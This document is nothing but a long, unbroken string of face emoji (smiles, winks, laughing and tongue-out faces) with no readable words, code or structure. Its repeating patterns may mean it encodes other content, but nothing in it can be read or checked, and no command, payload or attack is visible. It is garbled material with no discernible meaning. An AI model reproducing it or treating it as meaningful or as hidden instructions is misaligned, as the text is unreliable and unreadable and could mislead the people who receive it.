🙃😉😉😊😃😀😆🙃😊😆😀😂😅😀🙃😉🤪🤣😁😆🙂😇😝😊😃🤣🤣😉😉🙂😁🤣😁😜😊😆😝🤪😄😊😊🙂😝😜😁😜😉😆😉🙃😜😇😅😀😉😊😜🙂😂🙂😉😜😀🤪🤣🤣🙂😄😊😜😆😀🤣🤪🤪😀😃😁😁😜😊😁🤪😜😀😉🙃🙃😄😃😉😝😁🙃😃😃😊🤣😆😁😝😝😅😅🙂😂😀😝🙃🙃😄😅🙃😝😂😜🤣🤪😂😉😄😝😄😇🙂😀🙂😅😃😃🙃😝😄🙃😊😅😆😃😀😃🙃🙃😊😂🙂😃😜😝🙂🙃😃😅😀😄😂🙂😂🤪😄🤣🤣😊😜😄😆🙂🙃🙂😜😃🤣🤣😇😊😝🙂😆😆😉🙃😀😆🤣😁😂🤣🤪😝😂🙃😀😅🙃😃😁🙃😝🙃🤣😄😀😄😆😅🤪😀🤣😅😜😃😂😝🤣😜😀😂🙃😀😃😉🙂😊😀😇🙃😁😜😃😂😀😜😅🙂😃😀😝😜😊🙂😉😀😇🙃😅😀🙃🙃😅😃🤪🤣🤪😜😜🙂😅😃😃🙃😝😀😆😆😂😄🤪😅😊🙂😜😉🙂😂😄😀😁🙂🙃😃😅😉😃😉😅😄🙃😉🙂😁😄😇🙃😅😅🙂🙃😀😂🙂😝😃🙃😉😅🤣🙃😃😃😊😝🙃🙃🤣😆😄😄😊😁😀😇🙃😃😃😝😉🙃😂🙂😁😀😊😜😁🤪😉😇🤣🤣🤪🤣🤣🙃🙃🙂😄😃😉😝😁🙃😃😉😇😁😆🙃🤪😜😜😝🙂😃😀😝🙃🙃🤣😂😄😀😉😃😆😄🙃😇😅😉😝😜🤣🙂😉😝😃😃🙃😝😄🙃😊😅😆😃😆😝🙃😜😄😅😆😁😀🤣🙂🙃😃😅😉😃😉😆😃🤪😉😂😁🙃😇😇😅🙂🤪😀😆😉😝😃🙂😇😉🤪😁😃😊😝😆🙃😆😇😇😄😅🙃🤪😆😂🙂😀😃🙂😄😀🤪🙃🙃😉🤣😅😇😝🙃🤣😅😜😃🤪😃😂😇😜😊😆😃😃🤣😉😇🤪😅😊🙃😁🤪😝😊🤣😄🤪😝😂😄😀😇🙃🙂😅🤪😁😝😇🙃😅😅🤪😃🤣😝😜🙃😉😂😅😃🙃😅😁😄😊😅😆😃😇😝😊😀😅😆🤪😁🤣🙂😜😇🙂😅😀😄🙃😀😃🤪😃😂😝😉😅😝🤪🙃😂😅🤣😆😜😅😂😉😃😂🙃😄😄😀😊😝😁😉😝😁🤣😀😂😝😀😅🙃😃😃😝😃😀🙃🤣😄🤪😊😄😉😇🤣😅😜😃😂😝😀🙃🙃😅😄😃😝😃😂🙃😇😂😅😃😝😝🤣🙃😜😅🙂😃😀😝😝😁🤣😅😇😅😆😂😇🙃😅😅🤪😃😇😀🤣🤪😜😂😂😂😜🤪🙂😇😃😉🙂🙂😆😄😇😄😀😇😂😅😜😝🙂🙃😃😅🤪😆🙂🤪😄😇😉😝🤪😅🤣😄🤪🙃😂😅😀😃😝😉🙂🙂😃😁🙃🤣😁🤣🤪😄😝😊🤣😃🤪😝😂🙃😅😄😜🤣🙃😃😃😃😉😆😄😅😀😇🤪😀🤣😅😜😃😂😝😅😃😀🙃🙃😅😃😝🙂😀😄😉😇😅😜😃🤣😜😜😅🙂😃😀😝😄😜😝😝😜😃🤪😃😄😇😆🤣😇🤣😂🤪😜🙃🙂😅😃😃🤪😜🙂🤪😄😅😉😝😁🤣😊😇😆🤣🤪😅🤣😄🤪😝🤣🙂😃😅🙃😇😄😊😉🤣😁🙂😇😄😄😁😂🙂😀😃🙂😝😃🙃😃😁🙃🤣😁😆🤪😄😝😉🤣😃🤪😝😂🙃😂😅😀😁🙂🤣😃😂😉🙃😝😅😅😄😝🙃🤣😅😜😃😝😄😆😝😜🤪🙂🤪😝😜😁😉😇🙃😅😃😝😝🤣🙃😁😝🤪🤣🤣🤪😜😝😆😇😊😇😁😝😇🙃😅😅😄😝😝😇😅😇🤪🤣😂😝🤪😝🙃😅😃🤣😊😉😁😄😇😊🙃😃😂😅😜😝🙂🙃😃😅😜😃🙂🤪😄😊😊🙃😁😃🤣😂🤪🙃😂😅😀😃😜🤣🙂😇😃😃🙃😆😄🙃😊🙂😆🙂😝🤣😅😜😝🤪🤪😉🙃🙂😃😝😉🙃😁😅😃😂😊😄😁😇😝🙃🤣😀🤪😜😁😇😅😅😄😃😉😝😁🙃😇😅😅😃🙃😝😊😝😁😅🤪😃😃😁🙃🙃😄😅😊😃🙂😉😁🙂😇😁😆😇😝😄😂😄😊😜😃🤣🙃😝😄🙃😊😅🙃😆😁😀😇🙂😅😂😝🤣😄😆🙂😜😃😅😉😃😄😝😜😇🤪😀😃😁🤪😂😆🤪😝🙂🙃😉🙃😃😃🙃😉😅😁😃😄😆😉😉😆😄😇🤣😁😉😂😜😀😅🙃😃😃😝😀🤪🙃😀😀😊🙃😃😀🙂🙃🤣😊😃😂😝😀🙃🙃😅😄😃😉😝😁🙃😝🙃🙃😃😁😝🤣😜😜😅🙂😃😀😝😀😇🙂😝😃😄😉😃😁🙂😇😇😝🙃😂😃😜🙃🙂😅😃😃🤪😅🙂🤪😃🤣😉😅😊😄😅😜🤪😅😂😃😜😝😆😆😆😆😅🙃😊😉😄🙃😀😂😜🙂🤣😝🤪🙃😂😅😀😃🤪😝😂😆🤪😇🤣😀😝😅😆😂😊😝😆🙂😊😅😁😁😉😉🤪😁🙃🤣😃😂🙂😊😀😄🙂😂🤪😅🤣😅😜😃😂😝😅😝😀😂🙂😉😃😆😉😀😄😉😇😁😄😄😝😜😅😉🤪😜🙂😃😀😇😄😝😊😃😁😝😇🙃🙃😝😅😅🤪😃🤣🙃😝😅🙂😀😃😀🙃😝😝😇😆😜😇😝😅🙃🤪😅😝🙂😅🤪😜🤣😂😉😃😆🙃😄😄😂😊🙂😁🤣🙂😇😅😃🤪🙃😂😅😜😝😝🙂😉😇😁😃😊😝😆🙃😁😝😝😅🤣😃🤪🙃😁😜😇😀😆😇😉😉😁😝😇😃😆😝😝🙃😊🙂😅😆🤪😜🤣🤪😀😁🤣🙂😄😄😉😄😅🤪🤣😀😝😝🤣🙃😜😅😉😀😁😄😉😅😀😊😂😆😉🙂😁😃🙃😊😃😆😂😃🤪🤣😁🙃😊😆😀😝😂😆😝😇😆😂😇😝😅🙃🤪😅😁🙃😜😁🤪😝😄😝😆😇🤪😇😀🤣😆😊😝😃😅😝🤪🙃😝🙃😃😀😁😆🤣🤣🙃😆😝😄😃😝😆😜😝😅🤣😃🤪😝😝😁😉🙂😉😉😂🙃😂😉😂🤣😅😉😅😁😝🙃🤣😅😜😃😁🤪😝🤣😝🙂😊😆😊😅🤪😆😊😝😅🙃😝😝🤣🙃😜😅😝😆😂😄😀😝😂🙂😃😆😉😇😁😊😊😉😄😜🤣😝😜🙃🙂😅😃😃🙃😝😄🙃😀😀🙂😃😃😊😅🙃🤪😅😂😃😜😝🙂🙃🙃😅😜😄🤣😝😊😃😆😉😝😃😅😝🤪🙃😝😂🤣😅🤪😆🤣🙃🤪🤪😆😅😇🙂😆🙃😝😅🤣😃😁🙃🤪🙂🤣🙂😜😄🙂🙃😜🙃😉😃😄😄😇🤣😁🤪😝😂😇😆😂😝😀🙃🙃😅😄😃😉😝😁🙃😀😂🙃😃🙂🙃🤣😜😜😅🙂😃😀😝😝😝😆😝😉🙂🙃🙃😜😊😃🤪😃😇🤣😝😜🙃🙂😅😃😃🙃😝😉🙃😀😊🙂😃😅😆😅🙃🤪😅😂😃😜😝🙂🙃😃😅🤪😀🤣😝😊😉😆😇😝😃😅😝🤪🙃😊😝🤣🤣🤪🤪😂😝😀😉😉😁😁😀😅😝😝😉🤣😃🤪😝😂🙃😆🙂😜🙃🙂😄😃😇😉🙃😇😄😅🤣😝🙃🤣😅😜😃😊😜😂🙂😜🙃🙃😉😜😁😉🙂😁😂😊😆😆😄🤣😉😜😝🙂😃😀😝🙃🙃🤣😂😄😀😉😃😆😄🙃😇😅😉😝😜🤣🙂😂😝😃😉🙃😝😄🙃😊😅😊🙂😁😇😇😊😅😀🤪😆🤣😝🤪😉😂🙂😀🤣😊😆😊🙃😆😅😝😃😅😝🤪🙃😂😅😁😂😇😝🙃😜😉😝😁😃😊😝😆🙃😃🤪😇😜🤣😀🤪😝🤣🤣😜😜🙂😀😀🤪🤣😜😝😃😆😝😝🙃🤣😅😁🙃😜😄😂🤣😜🤣🙂😜😃😇😉😄😄🙃😉😁😆😇😝🙂🤣🙃😝😃🤣🤪😀😊🙃🙃🤪😊😆😂😇🙃😅😅🤪😃😊😆😅🤪😜🙃🤣😆😀😄🙃😊😄😊😉😉😁😀😊🤪😉😆😂😅😜😝🙂🙃😃😅😀🤪😂😂😜🙃🤣😂😃🤪🤣🙃🤪🙃😂😅😀😃😝🤣🙂😂😃😊😉😀😄🙂😉🤪😄🙂😇🤣😅😜🤪😜🤣😉😀😁🤪😜😉😇😁😅😇😃😆😝😁😉😝😅😅😉😉😅😀🙃🙃😅😄😃😉😝😁🙃🙂😅😉🤣😃😝😄🙂😜😉🙂😃😀😝🙃🙃🤣🙂😃😝😉😇😆😀😇😁😂😉😂😄😜🙃🙂😅😃😃🤪😜🙃😄😃😇😉🙃😆😃😁🤪😜😆😂😃😜😝🙂🙃😅🤣😀😅🙃😃😜🤪😊😊😁🤣😇😊😅😝😊😝🤣😄😜😊😂😝😃😃🙃🤣😄😜😉🙃🤪🤣🤣😃🤪😝😂🙃🤣😆🤪😄😅🤣😝🙃🙃😇😀😆😊😂😆🙂😉🤣😅😊😇😊😁😜😀😁😅😉🤪😅😉😆😜😇🤣😅🤪😅🤣🙃😜😅🙂😃🤣😜😀😄🙃🙃😝😜🙃😜😆😃😇😆😅😁😅😄😜😝🙂😅😃😃🙃😝😂🙂😊🙂😜😝😁😜😅😉🤪😊😂😃😜😝🙂🙃😜😁😊😄🙃🙃😆😁😉😉😉😜😝😃🤪🙃😂😅😀😃🙂😝😃🙃🤪😅🙂🙂😜😝😆😃🤪😀🤣😃🤪😝😂🙃🤣🙂🙃🤪🤪😃😀🤣😆😉😂🤣😊😄🤪😊😃😅😅😀🙂😆🤣🙃🙃😊😄😃😉😝😁🙃🤪🙃😄😇😜😜🤣😀😉😝😃🤣😀🤪😉😁😄😅😊😃😁😝😃😀😊😉😅😅😇😀😅🤪😜😂🙂😂😀🤣🙂😇😃😉🙂😜😇😝😅🙃🤪😅😂😃😜😝🙂🙃🤣😆🤪😃🤪😇😊😇😆😅😝😃😅😝😅😇🤪🤪🤣😜🙂🤪😄😃😉😅😁😃😊😝🙂😇😁🤣😇😝😅🙃😝😊🤣🤣😜😆🙂🙂🙂😜😁😅😇😃😆😝😝🙃🤣😅😊😃😇😜😆🙃😇😜😄😉😉😝😁🙃😇😅🙃😆😆😅😇😉🤣😂🤪😄😂😀😀😝🙂😉😄😁😊😃😇🙃😅😅🤪😃🤣😝😜🙃🙂😅😁😊😝😝🙃😇😊🤪😆😃😇😝😅🙃😁😇😝😄🤣🙃😜😆🙂🙂😃😃🙃😄😃🤪😉🙃🤪😅🤣😊🤪🙃😂😅😀😃😝😊😂🤪😃😇😉😅😄😇😊😂😆🙂😝😀😅😁🤪😝😆😜🤪😆🤣😇😜😂😆🙃😇😝😆😝😝🙃🤣😅😅🙃😜😃😂😝😀😅🙂😀😃😜🙃🤪😁🤣😇🤣😆😄😝😇🤣🙃😜😆😃🙂🙃🙃😄😅😊😃🙂😅😁😝😇🙃😅😃😇😀😅🤪😜😂🙂😂😀🤣🙂😇😃😉😃😁😝😀😅🙃🤪😅😂😃😆😄😝😇🤣😅😉😄😁😀😊🙃😆😅😝😃😉😆😆🤪🤪🙃😄🙂🙃😂😃🙃😉😅😁😃😀😂😊😇😆😆😇😜😁😃😝🤪🤣🙂😀😀🙂😃😀🤪😉🙂😇😁😆😝😝🙃🤣😅🤣😀😜😀😁😀🙃😝😄😃😉😝😁🙃😀😝😇😅😅😃😝🙃😆😅😜😀🙂😀😀😝😅😜😊🙂😁😝😇🙃😅😅😅😁😝😄🤣😉😜😉😂🤣😃😀🙃😝😁😊😆😝😇😝😅🙃🤪😅😝😁😃😃😆😄😂😉🙃😝😝🙂😃😀😜😊😂😆😉😊😝😆😜😊😆🤪🙃🤣😃🙃😉😅😁😃😀😝😊😅😁🤣😝😉😅😄🤪😊😆😇😀🤣🙂🤣😉😃🙂😅😇😃😆😝😝🙃😉😅😜🙂😆😆😂😜🙃😇😀🤪😆😝🙂😜😝😜😜😉🤣😇😊😅🤪😝😁🤣😂😝😇😄🤪😆😁😂😂😀🤪😜😆😊🙃😂😝😉😇🤪😅🙃😊😄🤪😅😄🙃🙂😃😇🤣😀😃😆😝🙃😄🙂😉😃🙂😅😂😉😜😉😄😄😉😂😁😊🙃😀🙂😀😀🙃🙂😝😃😄😄🤣😂😊😀😜🙂😄😜😂😆😂😂😊😇😆🤪🙂😝🤪😄😄😂😃😉😉🙂😜😅😁😇😂😂😂🙂😀😂😅🙂🙃😝🙃😀😄😆🤣😊😊🤣😉🙂😄😜😁😆😇🤣😀😅😆😂🙃😂🙃😄😜😁😄😂😉😊😇😂😁😝😇🙃😅😅😁😜😂🙂😉😅😜😉😁😃🤣😄😉😅😝😝😀😝😀😃😅😊😊🤣😀😀😄🤪😂😆🙃🙂🤪😆😀🤪😆🤣😁😇😊😁🤪😇😜😝🙂😀😀😃🙂😝😃🙃😀🙂🙃🙃😄😄😉😇😆😀😇😆😆🤪🤪😅😂😃😜🤣🙂😜🤣🙂😆😀😇😃😆😝😝🙃😉🤣😅😅🤪😉😂😄😀😁😂😁😃😄😉🤣😁😆😇😅😆😄😁😊😜🙃🙂😃😀😝🙃🙃🙃🙃😃😉😉😉😄🤪🤪🤪🤪🤣🤣😝😜🙃🙂😅😅😂😀😇🙃😊😃🙂😉🤣🙂😝😅🙃🤪😅😂😃😜😝🙂🙃😃😅😇😝🤣😝😊😉😆😉😝😃😅😝🤪🙃🤪😉😅😇🤪🤪😂🤪😜😅😜😀😇😁😆🙃😝😅🤣😃😁😜😝🤪😂😄😀😀🙃😃😀🤪🤪😃😇😂😆😝😝🙃🤣😅😊😂😅🙃😄😃🤣😉🤣🤣😊😝😜🙂😇🤪😅😃😝😝🤣🙃😁😂😜😀😂😃😃😄🤣😊😄😀😉😜😄😇😊😉😃😊😂😅😜🙃🙂😅😃😃🤪😆🙃😂😄😂😊🤣😁😇😊🤪😅😉😊😝😜🤪🙃😁😃😅😉😃😄😝😜😜😉🤪😆😁😇😄😁😇😝😉😂😁😀😁😂🤪😃😂😝😊😊😝😆🙃😝😅🤣😁😀🤪😂🙃😀😅🙃😃😃😝😉🙃😁😅😇😃😅😜😃😆🤣😅😜😃😂😝😄😆🙃😅😄😃😉😝😁🙃😇😅😅😃😝😝🤣🙃😜😅🙂😃😀😝🙃🙃😄😅😊😃😁😝😇😉😅😅🤪😃🤣😝😜🙃🙂😅😄😁🙃😝😄🙃😊🤣😆😃🤪😂😅🙃🤪😅😂😃😀😜🙂🙃😃😅😉😄😄😝😁😇😆😅😝😃😅😝😀😜😂😅😀😃🙂🤪😃🙃😉🤪😁😃😊🤪😆🙃😜😅🤣😃😜😃🙂🤣😀😅🙃😃😃😝😊😄😁😅😇😄😆😝😝🙃🤣😜😜😃😂😝😀🙃🙃🤣😄😃😉😝😁🙃😇😂😂😄😝😝🤣😉😜😅🙂😄😀😝🙃🙃😄😅😇😁😅🙃😇🙃😅🤣🤪😃😃😅😜🙃🙂😅😃😃🙃😝😄🙃😊😅😆😄😇😝😅🙃🤪😅😂😁😜😝🙃😊😃😅😉😃😄😜😊🙃🤪😝😝😃😅😝🤪🙃🙂😂😀😃🙂😝😃😇😉😅🤣🤣😊😝😆🙃😝😅😂😁🤪😝😂🙃😀🙃🙃😃😆😂😉🙃😁😅😇😃😅😜😝🙃🤣😅😜🤣😂😝😆🙃🙃😅😄😃😉😝😁🙃😇😅😅😃😝😜🤣🙃😜😉🙂😃😀😜🙃🙃😆😅😊😃😁😝😇😉😅😅🤪😁🤣😝😀😊🙂😅😄😁🙃😝😄🙃😊😂😆😃😂😅😅🙃🤪😅😂😃😀😜🙂🙃😃😅😉😆😄😝😄😀😆😅😝😃😅😝😜😊😂😅😀😃🙃😃😃🙃😄😊😁😃😊😝😆🙃🤪😂🤣😃🤪😝😂🤪😀😅😃🙂😃😝😉🙃😁😅😇😃😆😝😝🙃🤣😂😜😃🙂😄😀🙃🙃😂😄😃😉😝😁🙃😇😅😅😆😝😝🤣😉😜😅🙂😃😀😝🙃🙃😄😅😊😃😆😃😇🙃😅😅🤪😃😂😄😜🙃🙃😂😃😃🙃😝😄🤪😊😅🤪🙃😇😝😅🙃🤪😅🙂😁😜😝🙂🙃😃😊😉😃😆😊😊🙃😆😅😝😃🤣😜🤪🙃😂😅😀🙂🙂😝🙂😃😉😅😁😃😊😝😅😊😝😅🤣😃😜😅😂🙃😆😉🙃😃😃😝😉🙃😁😅😇😃😆😝😝🤪🤣😅😜🙃😂😝😀😊🙃😅😁😁😉😝😁🙃😇😊😅😃🙂😅🤣🙃😜😅🙂😃😃😜🙃🙃😄😅😊🙂😁😝😝😄😅😅🤪😃🤣😝😀😊🙂😅😃😃😉😅😄🙃😀😝😆😃😇😝😅🙃😜😂😂😃😜😝🙃😄😃😅😃😁😄😝😊🙃😆😅😝😃😅😝🤪🙃😂😊😀😃🙃🤣😃🙃😉😂😁😃😊😝😆🙃😝😅🤣😅🤪😝😂🤪😀😅🙃😂😃😝😊😊😁😅😇😃😅😄😝🙃😀😝😜😃😂😝😀🙃😉😂😄😃😉😝😁😜😇😅😝🙃😝😝🤣🙃😜😅🙃😁😀😝🙃🙃😄😇😊😃😉🤣😇🙃😅😅🤪😃😂😜😜🙃🙂😅😃🙃🙃😝😉🙂😊😅😆😃😇😝😅🙃🤪😅😂😃😀😄🙂🙃😃😝😉😃😄😜😊🙃😅😂😝😃😅😝🤪😜😂😅😉🙃🙂😝😃🙃😉😅😆😁😊😝😆🙃😝😇🤣😃😃😜😂🙃😀😅🙃😃😄😜😉🙃😁😅😇🙃😆😝🤣😄🤣😅😜😃😂😝😃😊🙃😅😄😃😊🤣😁🙃😀😃😅😃😝😝🤣🙃😜😅🙂😃😀😝🙃😜😄😅😊😉😁😝😇😊😅😅🤪😃🤣😝😜🙃🙂🙃😃😃😉😄😄🙃😊😊😆😃😝😜😅🙃🤪😅😂🤣😜😝😁😃😃😅😉😃😄😝😇😊😆😅😝😃🤣😁🤪🙃🙂🙂😀😃🙂😝😃🙃😊😂😁😃😊😝😅😀😝😅🤣😄🤪😝😂🙃😀😅😉😁😃😝😉🙃😁😝😇😃😊🙂😝🙃🤣😅😜😃😂😝😀🙃🙃😅😄🤣😉😝😆😃😇😅😅😁😝😝😂😊😜😅🙂😃😃😁🙃🙃😇😝😊😃😁😝😇🙃🤣😂🤪😃🤣😝😀😀🙂😅😄🤣🙃😝😄🙃😊😅😅😁😇😝😅🙃🤪😝😂😃😅😊🙂🙃😃😅😉😃😁😜😊🙃😆😅😝😉😅😝😀😉😂😅😀😃🙂😝😃🙃😉😅😁😃😇😁😆🙃😝🤪🤣😃🤪😜😂🙃😀😅🙃😃😃😝😉😝😁😅😇🤣😆😝😝😜🤣😅😀😁😂😝😀🙃🙃😉😄😃😅😅😁🙃😇😅😅😃🤪😜🤣🙃😜😅🙂😂😀😝😀🤣😄😅😊😃😁😝😝😊😅😅🤪😃😂😆😜🙃😄😊😃😃🙃😝😄🙃😇😂😆😃😇😝🤣😃🤪😅😊😅😜😝🙂🙃😃😅😉😃😄😝😊🙃😆😉😝😃🤣😅🤪🙃😂😂😀😃🙃😜😃🙃😉😅😁😂😊😝😆😇😝😅🤣😃🤪😝🙂😊😀😅🙃😃😄😆😉🙃🤣🙂😇😃😆😝😝🙃🤣😅😜😃😂😝😀😜🙃😅😄😁😉😝😁😊😇😅😅😃😝😝🤣🙃😜🙃🙂😃😃😄🙃🙃😄😊😊😃😆😜😇🙃😅😅🤪🤣🤣😝😉😃🙂😅😃😃🙃😝😁😊😊😅😆😃😝😁😅🙃😁😜😂😃😜😝🙂🙃😄😂😉😃😄😝😇😀😆😅😆😃😅😝🤪🙃😂😅😃😁🙂😝😃🙃😉😝😁😃😆😝😆🙃😝😅🤣😃🤪😝😂🙃😀😅🙃🤣😃😝😊😃😁😅😇😁😆😝😝🙃🤣😅😜😃🙂😁😀🙃🙃🤣😄😃😉😝😁🙃😇😅😅😃😝😝😂😀😜😅🙂😃😀😝🙃😇😄😅😇😁😁😝😇🙃😅😝🤪😃😃😅😜🙃🙂😅😃😃😉😜😄🙃😊😅😆😉😇😝😝😅🤪😅😂😃😜😝🙃😊😃😅😉😃😁😂😊🙃😉😊😝😃😅😝🤪🙃🙂😂😀😃🙂😝😄😆😉😅😉🙃😊😝😆🙃😝😅🤣😃🤪😝😂🙃😀😝🙃😃😄🙂😉🙃😁😂😇😃😅😜😝🙃🤣😅😜😉😂😝😊😃🙃😅😄😃😉😝😆😊😇😅😅😃🤪😂🤣🙃🙃😁🙂😃😀😝🙃🙃😁😂😊😃😁😝😝😆😅😅😄😇🤣😝😜🙃🙂😅😄😁🙃😝😄🙃😇😃😆😃😄😄😅🙃🤪😅😂😃😜😝🙂🙃😃😅😉😉😄😝😇😅😆😅😝😁😅😝🤪🙃😂😅😀😃🙃😆😃🙃😉😝😁😃😇🤣😆🙃🤪😂🤣😃🤪😝🙂😃😀😅😁🙃😃😝😉🙃😁😅😝😁😆😝😝🙃🤣🤪😜😃😄😃😀🙃🙃😅😄😃😊😜😁🙃😇😅😅😊😝😝🙃😅😜😅🙂😃😀😝😉😊😄😅😊😃😆🙂😇🙃😊😀🤪😃🤣😝😜🙃🙂😅😃😃🙃😝😁😃😊😅😆😇😇😝😅😊🤪😅🙂😁😄😂🙂🙃😃🤪😉😃😁🙂😊🙃😆😅😝😃😂😝🤪🙃😂😅😀😉🙂😝😄😄😉😅😅😅😊😝🤣🙃😝😅🤣😃😜🤣😂🙃😀🤪🙃😃🙂😊😉🙃😅😅😇😃😆😝🤪😄🤣😅😜😉😂😝😃🤣🙃😅😁😁😉😝😁🙃😇😜😅😃🙂😅🤣🙃😜😅🙂😃😃😜🙃🙃😄😅😊😇😁😝😄🤪😅😅🤪😃🤣😝😀😊🙂😅😃😃😉🙃😄🙃😇😊😆😃😇😝😅🙃😜😂😂😃😜😝🙃🤣😃😅😃😀😄😝😊🙃😆😅😝😃😅😝🤪🙃😂😜😀😃🙃😉😃🙃😉😂😁😃😊😝😆🙃😝😅🤣😉🤪😝🙂😄😀😅🙃😊😃😝😉🙃🤣😃😇😃😅😆😝🙃🤣😝😜😃🙂🤣😀🙃😉😂😂😁😉😝😆😃😇😅😜🙃😝😝🤣🙃😜😅🙃😁😀😝🙃🙃😄🤪😊😃😆😄😇🙃😅😅🤪😃😂😜😜🙃🙂😅😃😊🙃😝😅😜😊😅😆😃😇😝🤣😊🤪😅😂😃😀🙂🙂🙃😊🙂😉😃😄😝😊🙃😆😅😝😃😅😝😜😃😂😅😀😇🙂😝😃😊😉😅😅😃😊😝😆🙃😝😇🤣😃😜😅😂🙃😀😊🙃😃😃😝😉🙃😁😅😇😂😆😝🤪😀🤣😅😜😄😂😝😀🙃😇😃😄😃😊😃😁🙃😇😉😅😃🤪😁🤣🙃😜😅😉😃😀😝🙃😇😄😅😊😅😁😝😇😉😅😅🤪😃🙃🙃😜🙃🙂🤣😃😃🙃😜😄🙃😊🙂😆😃😝😜🙃😃🤪😅😂😁😜😝🙃😆😃😅😉😃😄😝😝🙃😆😅😝😃😅😜🤪🙃😂😂😀😃😃😂😃🙃😊😂😁😃😊😝😆😝😝😅😜😅🤪😝😂🙃😀😅🙃😃😃😝😉🙃😁😂😇😃😅😃😝🙃🤣😂😜😃🙃😝😀🙃🙃😅😄😁😉😝😁😊😇😅😅😝😝😝🤣🙃😜😅🙂😃😃😃🙃🙃😄🤣😊😃😁😝😇🙃😅😅🤪😃🤣😝😜😊🙂😅😃😅🙃😝😄😊😊😅😆😃😇😝😅🙃🤪🙂😂😃😜😝🙂🙃😃🤣😉😃😁😜😊🙃😆😅😝😅😅😝🙃😃😂😅😀😃🙂😝😄😊😉😅😁😃😇😄😆🙃😂😀🤣😃🤪😝😂🙃😃😂😇😊😃😝😉😜😁😅😜🙃😆😝😝🙃🤣😅😀😁🙃😀😀🙃🙃😇😄😃😃🤪😁🙃😇😅😅😃😝😝🤣🙃😜😅🙂😅😀😝😉😀😄😅😊😁😁😝😝😊😅😅🤪😃😂😄😜🙃😄😝😃😃🙃😝😄🙃😇😂😆😃😇😝😅😜🤪😅😝😀😜😝🙂🙃😃😅😊😁😄😝😊🙃😆😇😝😃😂😆🤪🙃😂😅😀😃🙃😜😃🙃😉😅😁🙃😊😝😂😉😝😅🤣😃🤪😝😂🙃😀😅🙃😃😄😄😉🙃😁😝😇😃😆😜😝🙃🤣😅😜😃😂😝😀😇🙃😅😄😅😉😝😁🤪😇😅🤣😁😝😝🤣🙃😜🙃🙂😃😉😀🙃🙃😄😅😊😃😆😁😇🙃😅😅🤪😅🤣😝😂😜🙂😅😃😄🙃😝😄🙃😊😅😆😅😝😉😅🙃🤪😅😂😃🙂😁🙂🙃😃🤣😉😃😁😃😇🤣😆😅😝😃😅😝😂🙂😂😅😀😄🙂😝😄😊😝🙃😁😃😇😃😆🙃🤣😜🤣😃🤪😝😂🙃😀😊🙃😇😃😝😉😝😁😅😅😀😆😝😝😉🤣😅😜😄😂😝😀😝😉😄😄😃😉😝😁🙃😅😆😅😃😝🤪🤣🙃😀😂😊😅😀😝🙃😝😄😅😃😄😁😝😇🙃😅😅🤪😂🙃🤣😜🙃🙂🙃😃😃😄😉😄🙃😊🤣😆😃😇😝😅🙃🤪🙃😂🤪😜😝🙂🙃😃😅😄🤪😄😝😊😉😆😅😝😅🤣😉🤪🙃😂😅😀😃😃😇😃🙃😉🤣😁😃😇😜😂😝😝😅🤣😅🤪😝😀😅😀😅🙃😃😃😝😇🙃😆😁😇😃😅😃😝🙃🤣🙃😜😃😃😂😀🙃😉😂😄😅😉😝😁😝😇😅🤪😊😝😝🤣🙃😜😅🙂😃😃😁🙃🙃😄🙃😊😃😁😝😇🙃😅🙃🤪😃😂😜😜🙃🙂😅😃🤣🙃😝😝😃😊😅😆😃😇😝🤣😊🤪😅😂😃😀😁🙂🙃😆😁😉😃😄😝😊🙃😅😂😝😃😅😝😜😀😂😅😃😅🙂😝😃🙃😉😅😆😁😊😝😆🙃😝😝🤣😃😂🙂😂🙃😀😅🙃😃😃😝😉🙃😁😅😇🤣😆😝🤪😃🤣😅😜😁😂😝😃🙃🙃😅😄😃😊😃😁🙃😜😜😅😃🤪😄🤣🙃😀😅🙂😃😀😝🙃😝😄😅😝🤣😁😝😇😊😅😅😜😁🤣😝😜🙃🙂😉😃😃😆😅😄🙃😊😅😆😃😝😜😅🙃🤪😅😂😂😜😝😀🤪😃😅😉😃😄😝😇😊😂😜😝😃🤣😆🤪🙃😉😅😀😃🙂😝😃🙃😊😂😂😅😊😝😅😃😝😅🤪😜🤪😝😂🙃😀😅🙃😃😃😝😉🙃😁😉😇😃😅😅😝🙃🤣😂😜😃🙂😝😀🙃🙃😅😄😅😉😝🙂😄😇😅😅🤣😝😝😂🙃😜😅🙂😃😃😃🙃🙃🙃🙂😊😃😆😀😇🙃🤣😂🤪😃🤣😝😜🤪🙂😅😉😊🙃😝😄🙃😊😅😆😃😇😝😅🙃🤪😊😂😃😀😃🙂🙃😃😅😉😃😄😝😊🙃😆😅😝🤣😅😝🤪😊😂😅😀😄🙂😝😄😊😉😅😁😃😇😄😆🙃😄😁🤣😃🤪😝😂🙃😃😂🙃😃😃😝😉😜😁😅🤣🙃😆😝😝🙃🤣😅😀😁😂😝😀🙃🙃😇😄😃😆😉😁🙃😇😅😅😃🤪😜😉😁😜😅🙂🙃😀😝😉😃😄😅😊😃😁😝😝😊🙂😜🤪😃😂🤣😜🙃😜😃😃😃🙃😝😄🙃😊😅😂😂😇😝😅😜🤪😅😂😉😜😝🙂😊😃😅😉😃🤣😇😊🙃😆😉😝😃😅😜🤪🙃😂🤣😀😃🙂😝😄😁😉😅😁😃😊😝😆😉😝😅🤣😃🤪😝😂😊😀😅🙃😃😃😝😉😊😁😅😇😃😆😝😝😊🤣😅😜😃😂😝😀🙃🙃😅😄😃😉😝😁🙃🙂😆😅🤣😝😝🤣🙃😜😅😜😃😂😀😜😉🙃😃😃😝😅😊😇🙃😅😅🤪😃😂😜😁😁🙂😅😃😁🙃😝😄😉😊😅😆😃😇😝🤣😊😃😜😂😃😀😀🙂🙃😃🤣😉😃😄😝😊🙃😅😂😀😅😅😝🤪😝😂😅😀😁🙂😝😃🙃😉😅😁😂😀😇😆🙃😝😉🤣😃🤪😝😂🙃😀🤣🙃😃😄😃😉🙃😁😅😀🤣😆😝😝🙃🤣😅😜😁😂😝😀🙃🙃😅😄😃😜😄😁🙃😇😅😅😃😝😝🤣🙃😜😅🙂😃😀😝😝🤪😄😅😊😃😁😝😇😇😅😅🤪😃🤣😝😜🙃😇😉😃😃🙃😝😄🙃😊🤣😆😃😇😝😅🙃🤪😅😊😀😜😝🙂😝😃😅😉😁😄😝😊😉😆😅😝😂😂🤣🤪🙃😂😅😀😃🙃🙃😃🙃😉🤣😁😃😊🤪😆🙃😝🙃🤣🤪🤪😝😂🙃😀😅🙃😝😃😝😉😉😁😅😇😅😅😉😝🙃🤣😅😜😃🙃😂😀🙃🙃🤣😄😃😊😁😂😅😇😅😅😃😝😝🙂😁😜😅🙂😄😀😝🙃😉😄😅😊😅😆😉😇🙃😅😅